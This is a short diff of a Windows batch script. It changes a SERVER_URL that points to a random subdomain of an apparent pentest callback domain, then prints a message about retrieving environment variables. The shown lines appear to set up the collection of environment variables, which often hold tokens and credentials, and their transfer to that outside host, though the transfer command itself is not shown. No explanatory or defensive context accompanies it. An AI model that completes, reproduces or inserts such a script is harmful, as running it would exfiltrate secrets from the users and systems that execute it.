@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set SERVER_URL=http://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com
+set SERVER_URL=http://p4urq3sbmerjpq9pz35rxaajdaj17yvn.pentestcollaborator.com
 
 echo Retrieving environment variables...
 
